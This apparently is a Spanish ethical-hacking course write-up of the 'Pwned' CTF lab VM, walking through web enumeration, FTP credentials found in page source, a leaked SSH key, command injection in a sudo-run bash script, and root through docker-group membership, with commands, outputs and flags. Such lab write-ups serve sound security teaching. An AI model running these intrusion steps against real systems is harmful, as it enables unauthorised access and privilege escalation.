---
title: "🖥️ Máquina: Pwned — Hacking Ético"
aliases:
  - Pwned
  - Máquina Pwned
  - VM Pwned
  - Writeup Pwned
tags:
  - ifct0109
  - hacking-etico
  - vms
  - linux
  - ctf
---

# 🖥️ Máquina: Pwned

> [!abstract] Ficha Técnica del Laboratorio
> **Sistema Operativo:** Linux  
> **Dificultad:** Conceptos Básicos  
> **Técnicas trabajadas:** Enumeración web · FTP · Credenciales en código fuente · Clave SSH privada · Command Injection (script bash) · Escalada de privilegios (grupo docker)  
> **Descripción:** En esta práctica seguiremos una cadena de pistas en la web hasta encontrar credenciales FTP en el código fuente, accederemos al FTP para descargar una clave SSH privada y movernos al primer usuario. Luego explotaremos un Command Injection en un script de mensajería para convertirnos en el segundo usuario y escalaremos a root aprovechando que ese usuario pertenece al grupo docker.  
> 
> 🔗 **Navegación:** [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|⬅️ Catálogo de Máquinas Hackeables]] &emsp;|&emsp; [[02 - MODULOS/04 - Hacking Ético|🧪 Hacking Ético]] &emsp;|&emsp; [[00 - INDICE|🏠 Inicio]]

---

## ⚙️ Configuración del Entorno de Red

Para ejecutar los comandos en tu laboratorio local (Red NAT):

* **`LHOST` (Atacante / Kali Linux):** Ej. `10.0.0.10`
* **`RHOST` (Víctima / Pwned):** Ej. `10.0.0.6`

> [!tip] Detección Previa de IP Víctima
> Si no conoces la IP asignada a la máquina Pwned tras encenderla, ejecuta en Kali:
> ```bash
> sudo netdiscover -r 10.0.0.0/24
> ```

---

## 🔎 Fase 1: Enumeración de servicios

```bash
nmap -sT -p- 10.0.0.6
```

```text
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

```bash
nmap -A -p21,22,80 10.0.0.6
```

```text
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Pwned....!!
```

> [!info] Resultado
> FTP, SSH y servidor web. Empezamos por la web. El código fuente de la página principal ya contiene un comentario con una pista:

```bash
curl http://10.0.0.6
```

```text
<!-- I forgot to add this on last note
     You are pretty smart as i thought 
     so here i left it for you 
     She sings very well. l loved it  -->
```

> [!info] Resultado
> El comentario menciona a una persona que canta bien, posible pista sobre un nombre de usuario. Enumeramos directorios:

---

## 🌐 Fase 2: Enumeración web y descubrimiento de recursos

```bash
gobuster dir -u http://10.0.0.6 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,php
```

```text
/robots.txt    (Status: 200) [Size: 41]
/nothing       (Status: 301) [--> http://10.0.0.6/nothing/]
/hidden_text   (Status: 301) [--> http://10.0.0.6/hidden_text/]
```

```bash
curl http://10.0.0.6/robots.txt
```

```text
# Group 1
User-agent: *
Allow: /nothing
```

Investigamos el directorio /nothing con gobuster y leemos su contenido:

```bash
gobuster dir -u http://10.0.0.6/nothing -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,php
```

```text
/nothing.html  (Status: 200) [Size: 194]
```

```bash
curl http://10.0.0.6/nothing/nothing.html
```

```text
<!--I said nothing here. you are wasting your time i don't lie-->
```

> [!info] Resultado
> Rabbit hole confirmado. El directorio /nothing no tiene nada útil. Investigamos el otro directorio encontrado:

```bash
curl http://10.0.0.6/hidden_text/
```

> [!info] Resultado
> Hay un archivo llamado secret.dic. Lo descargamos porque parece un diccionario de rutas para usar con gobuster:

```bash
curl http://10.0.0.6/hidden_text/secret.dic
```

```text
/hacked
/vanakam_nanba
/hackerman.gif
/facebook
/pwned
/pwned.com
/hacked.vuln
/users.vuln
/passwd.vuln
/pwned.vuln
/backup.vuln
/.ssh
/root
/home
...
```

```bash
curl http://10.0.0.6/hidden_text/secret.dic -o secret.dic
```

```bash
gobuster dir -u http://10.0.0.6 -w ./secret.dic -x php,html,txt
```

```text
/pwned.vuln  (Status: 301) [--> http://10.0.0.6/pwned.vuln/]
```

```bash
curl http://10.0.0.6/pwned.vuln/
```

> [!info] Resultado
> Hay un formulario de login. Revisando el código fuente de la página encontramos las credenciales del FTP comentadas en el PHP:

```text
// if ($un=='ftpuser' && $pw=='B0ss_B!TcH') {
//     echo "welcome"
//     exit();
```

> [!info] Resultado
> Credenciales FTP en texto claro dentro del código fuente: ftpuser:B0ss_B!TcH.

---

## 📁 Fase 3: Acceso FTP y obtención de clave SSH

```bash
ftp ftpuser@10.0.0.6
```

```text
220 (vsFTPd 3.0.3)
Password: B0ss_B!TcH
```

```bash
ls -la
```

```bash
cd share
```

```bash
ls -la
```

> [!info] Resultado
> Hay una nota y lo que parece una clave privada SSH. Las descargamos:

```bash
get note.txt
```

```bash
get id_rsa
```

```bash
exit
```

```bash
cat note.txt
```

```text
Wow you are here 
ariana won't happy about this note 
sorry ariana :(
```

> [!info] Resultado
> La nota menciona a ariana, lo que confirma el nombre de usuario sugerido por el comentario de la web sobre alguien que canta bien. La clave privada debe ser suya:

```bash
cat id_rsa
```

```text
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
...
GxY4+eGHY4WJUdAAAADHJvb3RAQW5ubHlubgECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
```

```bash
chmod 600 id_rsa
```

```bash
ssh -i id_rsa ariana@10.0.0.6
```

```text
ariana@pwned:~$
```

> [!info] Resultado
> La clave no tiene passphrase y accedemos directamente.

```bash
id
```

```text
uid=1000(ariana) gid=1000(ariana) groups=1000(ariana),24(cdrom),25(floppy),29(audio)...
```

```bash
ls -la
```

```bash
cat user1.txt
```

```text
congratulations you Pwned ariana 
Here is your user flag ↓↓↓↓↓↓↓
fb8d98be1265dd88bac522e1b2182140
Try harder. need become root
```

> [!info] Resultado
> Flag de ariana obtenida: fb8d98be1265dd88bac522e1b2182140

---

## 👤 Fase 4: Movimiento lateral — Command Injection en script bash

```bash
sudo -l
```

```text
(selena) NOPASSWD: /home/messenger.sh
```

> [!info] Resultado
> ariana puede ejecutar /home/messenger.sh como el usuario selena. Inspeccionamos el script:

```bash
ls -la /home/messenger.sh
```

```text
-rwxr-xr-x 1 root root 367 Jul 10  2020 /home/messenger.sh
```

```bash
cat /home/messenger.sh
```

```text
#!/bin/bash
clear
echo "Welcome to linux.messenger "
      echo ""
users=$(cat /etc/passwd | grep home | cut -d/ -f 3)
      echo ""
echo "$users"
      echo ""
read -p "Enter username to send message : " name 
      echo ""
read -p "Enter message for $name :" msg
      echo ""
echo "Sending message to $name "
$msg 2> /dev/null
      echo ""
echo "Message sent to $name :) "
      echo ""
```

> [!info] Resultado
> La línea clave es $msg 2> /dev/null. El script lee el mensaje del usuario y lo ejecuta directamente como comando en el contexto de selena. Esto es un Command Injection: cualquier cosa que introduzcamos como mensaje se ejecutará en el sistema. Verificamos primero el comportamiento normal y luego explotamos:

```bash
sudo -u selena /home/messenger.sh
```

```text
Welcome to linux.messenger 

ariana:
selena:
ftpuser:

Enter username to send message : ftpuser
Enter message for ftpuser : id
Sending message to ftpuser 
uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)
Message sent to ftpuser :)
```

> [!info] Resultado
> El comando id se ejecutó como selena. Además vemos que selena pertenece al grupo docker, dato importante para la escalada de privilegios. Ahora usamos el injection para obtener una shell:

```bash
sudo -u selena /home/messenger.sh
```

```text
Enter username to send message : ftpuser
Enter message for ftpuser : /bin/bash
Sending message to ftpuser
```

```bash
id
```

```text
uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)
```

Mejoramos la shell:

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```

```bash
cd ~
```

```bash
ls -la
```

```bash
cat user2.txt
```

```text
711fdfc6caad532815a440f7f295c176
You are near to me. you found selena too.
Try harder to catch me
```

> [!info] Resultado
> Flag de selena obtenida: 711fdfc6caad532815a440f7f295c176

---

## 🚀 Fase 5: Escalada de privilegios — grupo docker

```bash
groups
```

```text
selena docker
```

> [!info] Resultado
> selena pertenece al grupo docker. Pertenecer a este grupo es equivalente a tener acceso de root en el sistema host. El motivo es que Docker puede montar el sistema de archivos del host dentro de un contenedor y, si arrancamos un contenedor con acceso de root al sistema de archivos completo, podemos leer y modificar cualquier archivo del host como si fuéramos root.
> La técnica consiste en arrancar un contenedor ligero (Alpine), montar la raíz del host en /mnt dentro del contenedor y usar chroot para cambiar la raíz del proceso al sistema host. El resultado es una shell de root sobre el sistema real. La receta exacta está documentada en GTFOBins — docker:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
```

```bash
cd /root
```

```bash
ls -la
```

```bash
cat root.txt
```

```text
4d4098d64e163d2726959455d046fd7c
```

> [!info] Resultado
> Flag de root obtenida: 4d4098d64e163d2726959455d046fd7c

---

> [!note] 🔗 Enlaces Relacionados
> * 💻 [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|Volver al Catálogo de Máquinas Hackeables]]
> * 🌐 [[02 - MODULOS/Hacking Ético/01 - Web Fuzzing|Guía de Web Fuzzing]]
> * 🔍 [[02 - MODULOS/Hacking Ético/02 - Reconocimiento Bug Bounty|Metodología de Reconocimiento]]
